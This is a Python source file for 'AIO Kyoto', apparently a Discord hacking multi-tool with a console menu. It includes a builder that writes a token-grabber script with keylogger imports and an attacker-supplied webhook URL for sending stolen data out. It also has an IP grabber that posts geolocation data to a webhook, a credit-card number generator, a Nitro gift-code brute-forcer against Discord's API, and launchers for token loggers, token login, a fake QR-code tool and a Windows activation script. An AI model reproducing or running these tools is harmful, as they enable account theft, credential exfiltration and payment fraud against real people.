import os, requests, time, random, sys,threading
from colorama.ansi import clear_screen
import pprint
import string
import discord, json
import requests
from random import choice
from art import text2art, FONT_NAMES
from colorama import Fore, init
from pystyle import *
from os import name,system,mkdir
from requests.api import options
import subprocess
from math import exp
import random, time
from random import Random
import json,requests
from selenium import webdriver
from dhooks import Webhook, Embed
from datetime import datetime
from cx_Freeze import setup, Executable

init(convert=True)
valid = 0
invalid = 0

characters = string.ascii_letters +  string.digits

y = Fore.WHITE
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX
r = Fore.RED


def tokenloger():
    os.system("start Files\\token_loger\\tokenloger.py")

def windows():
    os.system("start Files\\boostFps\\Boost_winn")



def tokeninfo():
    os.system("start Files\\token_info\\token_info.py")

def hypesquadchanger():
    print(f"""{y}[{Fore.RED}+{y}]{w} house Choice ~>  \n\n""")
    print(f"""          {y}[{Fore.RED}01{y}]{w} Bravery""")
    print(f"""          {y}[{Fore.RED}02{y}]{w} Brilliance""")
    print(f"""          {y}[{Fore.RED}03{y}]{w} Balance\n\n\n""")
    print(f"""{y}[{w}+{y}]{w} Enter your House choice : """)
    house = str(input(f"""{y}[{Fore.RED}+{y}]{w} Choice: """))
    print(f"""\n{y}[{Fore.RED}+{y}]{w} Enter the token""")
    token = str(input(f"""{y}[{Fore.RED}+{y}]{w} Token: """))
    
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
    if house == "1" or house == "01":
        payload = {'house_id': 1}
    elif house == "2" or house == "02":
        payload = {'house_id': 2}
    elif house == "3" or house == "03":
        payload = {'house_id': 3}
    else:
        print(f"""          {y}[{Fore.LIGHTRED_EX }#{y}]{w} Invalid Choice""")
        input(f"""\n{y}[{b}#{y}]{w} Press ENTER to exit""")
    r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    if r.status_code == 204:
        print(f""" \n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Hypesquad House changed""")
        input(f"""\n{y}[{b}#{y}]{w} Press ENTER to exit""")
    else:
        print(f"""          {y}[{Fore.LIGHTRED_EX }#{y}]{w} Invalid token""")
        input(f"""\n{y}[{b}#{y}]{w} Press ENTER to exit""")
        
    hypesquadchanger()
    



def ip():
    hook = Webhook(input(f"{Fore.RED}$ URL *{Fore.WHITE}WEBHOOK{Fore.RED}* ~> "))

    time = datetime.now().strftime("%H:%M %p")  
    ip = requests.get('https://api.ipify.org/').text

    r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
    geo = r.json()
    embed = Embed()
    fields = [

        {'name': 'IP', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'Status', 'value': geo['status']},
    ]
    for field in fields:
        if field['value']:
            embed.add_field(name=field['name'], value=field['value'], inline=True)
    hook.send(embed=embed)
    




def activation():
    os.system("start Files\\Windows_10_clef\\bat.bat")



def qrcode():
    os.system("start Files\\qrcode\\main.py")



def back():
        os.system("start Files\\Advanced-Discord-Server-Cloner-main\\start.bat")

system('start Files\\song\\eternal-youth.mp3')

def tokenlogin():
    os.system("start Files\\Token_login\\token_login\\tokenlogin.py")


def proxygrabber():
    os.system("Files\\proxy_grabber\\Proxy.exe")

def cc():
    nb_nitros = int(input(f"{Fore.RED}$ Gen *{Fore.WHITE}CC{Fore.RED}* ~> "))
    nb = 1
    print("Gen")
    while nb <= nb_nitros:
        exp_date2 = str(random.randint(1, 12))
        if exp_date2 == str(1):
            exp_date2 = "0" + exp_date2
        elif exp_date2 == str(2):
            exp_date2 = "0" + exp_date2
        elif exp_date2 == str(3):
            exp_date2 = "0" + exp_date2
        elif exp_date2 == str(4):
            exp_date2 = "0" + exp_date2
        elif exp_date2 == str(5):
            exp_date2 = "0" + exp_date2
        elif exp_date2 == str(6):
            exp_date2 = "0" + exp_date2
        elif exp_date2 == str(7):
            exp_date2 = "0" + exp_date2
        elif exp_date2 == str(8):
            exp_date2 = "0" + exp_date2
        elif exp_date2 == str(9):
            exp_date2 = "0" + exp_date2
        elif exp_date2 == str(10):
            pass
        elif exp_date2 == str(11):
            pass
        elif exp_date2 == str(12):
            pass
        card = "4540 03" + str(random.randint(10, 99)) + " " + str(random.randint(1000, 9999)) + " " + str(random.randint(1000, 9999)) + " | " + exp_date2 + "/"  + str(random.randint(21, 26)) + " | " + str(random.randint(100, 999))
        f = open('Codes.txt', "a+")
        f.write(f'{card}\n')
        f.close()
        print(f"[GENERATED] - {card}")
        time.sleep(0.025)
        nb += 1

def gr33ber():
    WEBHOOK_URL=input(f"{Fore.RED}$ URL *{Fore.WHITE}Webhook{Fore.RED}* ~>  ")
    print()
    name=input(f"{Fore.RED}$ file *{Fore.WHITE}Name.py{Fore.RED}* ~> ")
    code1="""
    import os, re, json, random, platform, socket, uuid, requests
    import re
    import json
    import time
    from pynput.keyboard import Key, Listener
    import logging
    from urllib.request import Request, urlopen

    """
    code2="WEBHOOK_URL='"+WEBHOOK_URL+"'\n\n"
    fichier=open("Files\\g33ber\\code.txt","r")
    code3=fichier.read()
    f = open(name,'w')
    f.write(code1+code2+code3)
    f.close()
    fichier.close()



def Boost_FTN():
    os.system("start Files\\boostFps\\Boost_FTNn")




def clear():
    system("cls" if name == 'nt' else "clear")

if name == 'nt':
    system("title AIO Kyoto")

def song():
    os.system("taskkill /IM wmplayer.exe")



def token():
    amount = int(input(Fore.RED+f'$ Gen {Fore.WHITE}Token{Fore.RED} ~> '))
    Spinner2()
    value = 1,2,3,4,5,6,7,8,9,0
    with open("Token.txt", "w", encoding='utf-8') as file:
        print("")
        for i in range(amount):
            code = "".join(random.choices(
                string.ascii_uppercase + string.digits + string.ascii_lowercase,
                k = 16
            ))
            file.write(f"NjQxNjU1NjgyOTAyMjYxNzYz{code}\n")
    print(Fore.YELLOW+f"Generated {amount} codes\n")
    input('Press ENTER to exit') 
    print("Closing...")
    system("cls")


def Spinner2():
    l = ['|', '/', '-', '\\']
    for i in l+l+l:
        sys.stdout.write(f"""\r{y}[{r}+{y}]{w} Gen {i}""")
        sys.stdout.flush()
        time.sleep(0.2)

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write(f"""\r{y}[{r}+{y}]{w} Loading... {i}""")
		sys.stdout.flush()
		time.sleep(0.2)




def nitrogen():
    amount = int(input(Fore.RED+f'$ Gen *{Fore.WHITE}Nitro{Fore.WHITE}{Fore.RED}* ~> '))
    value = 1,2,3,4,5,6,7,8,9,10,1000
    with open("Nitro Codes.txt", "w", encoding='utf-8') as file:
        Spinner()
        print("gen...")
        for i in range(amount):
            code = "".join(random.choices(
                string.ascii_uppercase + string.digits + string.ascii_lowercase,
                k = 16
            ))
            file.write(f"https://discord.gift/{code}\n")
        print(f"Generated {amount} codes\n")
    with open("Nitro Codes.txt") as file:
        for line in file.readlines():
            nitro = line.strip("\n")
            url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
            r = requests.get(url)
            
        if r.status_code == 200:
            print(f"\n\n Valid | {nitro}\n\n") #If the nitro code will be valid, it will print nitro code leaving two lines for focus xD.
        else:
            print(f"*", end = "")   #It will print "*" if the nitro code won't be valid.
            print("\n\n\nYou have generated codes and checked it succesfuly, hope you got some valid ones")
def scraper():
    r = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http')
    print(r.text)
    p_type = input('  Type> ')
    p_timeout = input('  Timeout> ')
    f"https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}"
    with open('proxies.txt', 'w') as f:
        f.write(r.text)
        print('The proxies have been saved to \033[31m`proxies.txt`')
        time.sleep(5)
        Main()
class Main():
    def __init__(self):
        self.gg = True
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.rr = '\033[39m'
        self.cls()
        self.start_logo()
        self.options()
        while self.gg == True:
            choose = input(f"""{y}[{r}+{y}]{w} $ Choice ~> """)
            if(choose == str(1)):
                self.cls()
                Spinner()
                os.system("cls")
                self.start_logo()
                nitrogen()
            elif (choose == str (2)):
                self.cls()
                Spinner()
                os.system("cls")
                self.start_logo()
                token()
            elif(choose == str(3)):
                self.cls()
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                scraper()
            elif (choose == str(4)):
                self.cls()
                Spinner()
                os.system("cls")
                self.start_logo()
                proxygrabber()
            elif (choose == str(5)):
                self.cls()
                Spinner()
                os.system("cls")
                self.start_logo()
                cc()
            elif(choose == str(99)):
                self.cls
                os.system("cls")
                self.start_logo()
                self.options()
            elif(choose == str (11)):
                self.cls
                os.system("taskkill /IM wmplayer.exe")
                os.system("cls")
                self.start_logo()
                self.options()
                song()
            elif(choose == str (6)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                gr33ber()
            elif(choose == str (15)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                Boost_FTN()
            elif(choose == str(0)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                tokenlogin()
            elif(choose == str(17)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                activation()
            elif(choose == str(7)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                qrcode()
            elif(choose == str(12)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                back()
            elif(choose == str (8)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                ip()
            elif(choose == str (13)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                hypesquadchanger()
            elif(choose == str (10)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                tokeninfo()
            elif(choose == str (16)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                windows()
            elif (choose == str (9)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()
                tokenloger()
            elif (choose == str (18)):
                self.cls
                os.system("cls")
                Spinner()
                os.system("cls")
                self.start_logo()

            Main()


        


    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def start_logo(self):
        clear = "\x1b[0m"
        colors = [1]

        x = f"""

                      █████╗ ██╗ ██████╗     ██╗  ██╗██╗   ██╗ ██████╗ ████████╗ ██████╗ 
                     ██╔══██╗██║██╔═══██╗    ██║ ██╔╝╚██╗ ██╔╝██╔═══██╗╚══██╔══╝██╔═══██╗
                     ███████║██║██║   ██║    █████╔╝  ╚████╔╝ ██║   ██║   ██║   ██║   ██║
                     ██╔══██║██║██║   ██║    ██╔═██╗   ╚██╔╝  ██║   ██║   ██║   ██║   ██║
                     ██║  ██║██║╚██████╔╝    ██║  ██╗   ██║   ╚██████╔╝   ██║   ╚██████╔╝
                     ╚═╝  ╚═╝╚═╝ ╚═════╝     ╚═╝  ╚═╝   ╚═╝    ╚═════╝    ╚═╝    ╚═════╝ 
                     {y}[{r}+{y}]{w} Enter {Fore.WHITE}99 {Fore.RED}for back
                                                                    
                                  
        """ .replace('█', Fore.RED+"█"+Fore.RESET)

        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)

    def options(self):
        print(f"""            {y}[{r}+{y}]{w} Gen/Checker Options:  {y}[{r}+{y}]{w} Token Options:    {y}[{r}+{y}]{w}  Main Discord :      {y}[{r}+{y}]{w}  Boost Fps:\n""")
        print(f"""            {y}[{r}1{y}]{w} Nitro Gen            {y}[{r}6{y}]{w} Token Gr33ber    {y}[{r}12{y}]{w} Backup by Social404 {y}[{r}15{y}]{w} Boost FPS Fortnite\n""")
        print(f"""            {y}[{r}2{y}]{w} Token Gen            {y}[{r}7{y}]{w} FakeQrCode       {y}[{r}13{y}]{w} HypeSquadChanger    {y}[{r}16{y}]{w} Boost FPS Windows\n""")
        print(f"""            {y}[{r}3{y}]{w} Proxy Gen            {y}[{r}8{y}]{w} IP Grabber       {y}[{r}14{y}]{w} WebHooks Remover    {y}[{r}17{y}]{w} Activation windows\n""")
        print(f"""            {y}[{r}4{y}]{w} Proxy Grabber        {y}[{r}9{y}]{w} 100% bypass rate\n      """)
        print(f"""            {y}[{r}5{y}]{w} CC Gen               {y}[{r}10{y}]{w} Token Info\n""")     
        print(f"""            {y}[{r}0{y}]{w} login Token           {y}[{r}11{y}]{w} Stop song        {y}[{r}18{y}]{w} Other Tools Soon...\n\n """)
Main()